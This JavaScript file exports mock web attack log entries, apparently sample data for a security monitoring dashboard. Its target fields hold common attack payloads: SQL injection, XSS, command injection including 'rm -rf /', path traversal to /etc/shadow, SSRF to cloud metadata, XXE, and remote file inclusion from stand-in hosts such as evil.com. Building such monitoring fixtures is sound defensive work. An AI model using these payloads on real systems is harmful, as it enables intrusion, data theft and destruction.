export const mockAttacks = [
    // SQL Injection - BREACH CONFIRMED (200 OK + Large Response)
    { id: 1, timestamp: '2023-11-27 10:42:01', ip: '192.168.1.105', target: '/api/v1/auth?user=\' OR \'1\'=\'1', type: 'SQL Injection', severity: 'Critical', status: 'Success', status_code: 200, response_size: '45.2 KB' },
    { id: 2, timestamp: '2023-11-27 10:12:10', ip: '192.168.1.200', target: '/login?user=admin\'--', type: 'SQL Injection', severity: 'Critical', status: 'Success', status_code: 200, response_size: '12.8 KB' },

    // SQL Injection - BLOCKED (403 Forbidden)
    { id: 3, timestamp: '2023-11-27 10:35:20', ip: '192.168.1.105', target: '/products?id=1; DROP TABLE users', type: 'SQL Injection', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 4, timestamp: '2023-11-27 09:45:00', ip: '10.0.0.5', target: '/search?q=\' UNION SELECT username, password FROM users--', type: 'SQL Injection', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },

    // XSS - MITIGATED (Filtered/Sanitized - 200 OK but Small Response)
    { id: 5, timestamp: '2023-11-27 10:40:12', ip: '10.0.0.55', target: '/public/assets?name=<script>alert(1)</script>', type: 'XSS', severity: 'Medium', status: 'Blocked', status_code: 200, response_size: '1.2 KB' },
    { id: 6, timestamp: '2023-11-27 10:32:10', ip: '89.12.43.11', target: '/search?q=<img src=x onerror=alert(1)>', type: 'XSS', severity: 'Medium', status: 'Blocked', status_code: 200, response_size: '1.5 KB' },

    // Command Injection - BLOCKED
    { id: 7, timestamp: '2023-11-27 10:05:30', ip: '198.51.100.55', target: '/shell?cmd=cat /etc/passwd', type: 'Command Injection', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },

    // Directory Traversal - FAILED (404 Not Found)
    { id: 8, timestamp: '2023-11-27 10:28:55', ip: '198.51.100.2', target: '/config?path=../../../../etc/passwd', type: 'Directory Traversal', severity: 'High', status: 'Failed', status_code: 404, response_size: '0.4 KB' },

    // Typosquatting
    { id: 9, timestamp: '2023-11-27 08:30:00', ip: '45.33.22.11', target: 'http://goggle.com/login', type: 'Typosquatting', severity: 'High', status: 'Flagged', status_code: 301, response_size: '0 KB' },

    // SSRF - BLOCKED
    { id: 10, timestamp: '2023-11-27 09:05:00', ip: '10.10.10.20', target: '/proxy?url=http://169.254.169.254/latest/meta-data/', type: 'SSRF', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },

    // Web Shell - BLOCKED
    { id: 11, timestamp: '2023-11-27 10:30:05', ip: '203.0.113.45', target: '/upload/cmd.jsp', type: 'Web Shell', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },

    // Brute Force - FLAGGED (Multiple 401s)
    { id: 12, timestamp: '2023-11-27 10:41:55', ip: '45.22.19.112', target: '/admin/login', type: 'Brute Force', severity: 'High', status: 'Flagged', status_code: 401, response_size: '1.2 KB' },

    // More Data...
    { id: 13, timestamp: '2023-11-27 09:15:30', ip: '172.16.0.10', target: '/order?id=1 OR 1=1', type: 'SQL Injection', severity: 'High', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 14, timestamp: '2023-11-27 09:55:00', ip: '192.168.1.50', target: '/profile?bio=<svg/onload=alert(1)>', type: 'XSS', severity: 'Medium', status: 'Blocked', status_code: 200, response_size: '1.1 KB' },
    { id: 15, timestamp: '2023-11-27 09:20:15', ip: '10.10.10.5', target: '/comment?text=<iframe src="javascript:alert(1)">', type: 'XSS', severity: 'Medium', status: 'Blocked', status_code: 200, response_size: '1.3 KB' },
    { id: 16, timestamp: '2023-11-27 09:10:00', ip: '192.168.1.15', target: '/download?file=..\\..\\windows\\win.ini', type: 'Directory Traversal', severity: 'High', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 17, timestamp: '2023-11-27 09:30:00', ip: '172.16.0.30', target: '/ping?ip=127.0.0.1; rm -rf /', type: 'Command Injection', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 18, timestamp: '2023-11-27 08:25:00', ip: '192.168.1.70', target: '/fetch?uri=http://localhost:8080/admin', type: 'SSRF', severity: 'High', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 19, timestamp: '2023-11-27 08:10:00', ip: '45.22.19.112', target: '/include?file=http://evil.com/shell.php', type: 'RFI', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 20, timestamp: '2023-11-27 10:25:30', ip: '192.0.2.1', target: '/login', type: 'Credential Stuffing', severity: 'Medium', status: 'Flagged', status_code: 401, response_size: '1.2 KB' },
    { id: 21, timestamp: '2023-11-27 09:00:00', ip: '10.0.0.30', target: '/transfer?to=alice&amount=100&to=bob', type: 'HTTP Parameter Pollution', severity: 'Medium', status: 'Flagged', status_code: 200, response_size: '2.5 KB' },
    { id: 22, timestamp: '2023-11-27 08:05:00', ip: '172.16.0.50', target: '/xml?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', type: 'XXE', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 23, timestamp: '2023-11-27 09:50:00', ip: '198.51.100.70', target: '/images/backdoor.asp', type: 'Web Shell', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 24, timestamp: '2023-11-27 10:38:45', ip: '172.16.0.23', target: '/api/user/data', type: 'SQL Injection', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 25, timestamp: '2023-11-27 10:22:15', ip: '10.10.10.10', target: '/api/admin?id=1\' OR \'1\'=\'1', type: 'SQL Injection', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 26, timestamp: '2023-11-27 10:20:00', ip: '172.16.1.1', target: '/graphql', type: 'XSS', severity: 'Low', status: 'Success', status_code: 200, response_size: '5.6 KB' },
    { id: 27, timestamp: '2023-11-27 10:18:45', ip: '192.168.0.1', target: '/search?q=<script>document.cookie</script>', type: 'XSS', severity: 'Medium', status: 'Success', status_code: 200, response_size: '8.2 KB' },
    { id: 28, timestamp: '2023-11-27 10:15:20', ip: '10.0.0.1', target: '/download?file=../../etc/shadow', type: 'Directory Traversal', severity: 'High', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 29, timestamp: '2023-11-27 10:08:55', ip: '203.0.113.99', target: '/admin/shell.jsp', type: 'Web Shell', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 30, timestamp: '2023-11-27 10:02:15', ip: '192.0.2.100', target: '/cmd?exec=whoami', type: 'Command Injection', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 31, timestamp: '2023-11-27 10:00:00', ip: '10.10.20.20', target: '/api?url=file:///etc/passwd', type: 'SSRF', severity: 'High', status: 'Flagged', status_code: 200, response_size: '15.4 KB' },
    { id: 32, timestamp: '2023-11-27 09:58:45', ip: '172.16.5.5', target: '/page?include=../../../config.php', type: 'Directory Traversal', severity: 'High', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 33, timestamp: '2023-11-27 07:20:00', ip: '192.168.1.100', target: '/login', type: 'Brute Force', severity: 'Medium', status: 'Flagged', status_code: 401, response_size: '1.2 KB' },
    { id: 34, timestamp: '2023-11-27 07:15:00', ip: '10.0.0.40', target: '/admin', type: 'Brute Force', severity: 'Medium', status: 'Flagged', status_code: 401, response_size: '1.2 KB' },
    { id: 35, timestamp: '2023-11-27 07:10:00', ip: '172.16.0.60', target: '/login', type: 'Credential Stuffing', severity: 'Medium', status: 'Flagged', status_code: 401, response_size: '1.2 KB' },
    { id: 36, timestamp: '2023-11-27 07:05:00', ip: '198.51.100.80', target: 'http://gooogle.com', type: 'Typosquatting', severity: 'Medium', status: 'Flagged', status_code: 301, response_size: '0 KB' },
    { id: 37, timestamp: '2023-11-27 07:00:00', ip: '203.0.113.60', target: 'http://microoft.com', type: 'Typosquatting', severity: 'Medium', status: 'Flagged', status_code: 301, response_size: '0 KB' },
    { id: 38, timestamp: '2023-11-27 06:55:00', ip: '45.22.19.113', target: '/action?param1=val&param1=malicious', type: 'HTTP Parameter Pollution', severity: 'Low', status: 'Flagged', status_code: 200, response_size: '2.1 KB' },
    { id: 39, timestamp: '2023-11-27 06:50:00', ip: '192.168.1.110', target: '/api/v1/admin?id=1\' UNION SELECT password--', type: 'SQL Injection', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 40, timestamp: '2023-11-27 06:45:00', ip: '10.0.0.50', target: '/search?q=<script>alert(1)</script>', type: 'XSS', severity: 'Medium', status: 'Blocked', status_code: 200, response_size: '1.2 KB' },
    { id: 41, timestamp: '2023-11-27 06:40:00', ip: '172.16.0.70', target: '/config?path=../../../../etc/passwd', type: 'Directory Traversal', severity: 'High', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 42, timestamp: '2023-11-27 06:35:00', ip: '198.51.100.90', target: '/shell?cmd=ls', type: 'Command Injection', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 43, timestamp: '2023-11-27 06:30:00', ip: '203.0.113.70', target: '/proxy?url=http://localhost', type: 'SSRF', severity: 'High', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 44, timestamp: '2023-11-27 06:25:00', ip: '45.22.19.114', target: '/include?file=shell.php', type: 'RFI', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 45, timestamp: '2023-11-27 06:20:00', ip: '192.168.1.120', target: '/login', type: 'Credential Stuffing', severity: 'Medium', status: 'Flagged', status_code: 401, response_size: '1.2 KB' },
    { id: 46, timestamp: '2023-11-27 06:15:00', ip: '10.0.0.60', target: '/vote?id=1&id=2', type: 'HTTP Parameter Pollution', severity: 'Low', status: 'Success', status_code: 200, response_size: '2.5 KB' },
    { id: 47, timestamp: '2023-11-27 06:10:00', ip: '172.16.0.80', target: '/xml', type: 'XXE', severity: 'High', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 48, timestamp: '2023-11-27 06:05:00', ip: '198.51.100.100', target: '/upload/shell.php', type: 'Web Shell', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 49, timestamp: '2023-11-27 06:00:00', ip: '203.0.113.80', target: '/include?page=http://malicious.com/backdoor', type: 'RFI', severity: 'Critical', status: 'Blocked', status_code: 403, response_size: '0 KB' },
    { id: 50, timestamp: '2023-11-27 05:55:00', ip: '45.22.19.115', target: '/admin', type: 'Brute Force', severity: 'High', status: 'Flagged', status_code: 401, response_size: '1.2 KB' },
];
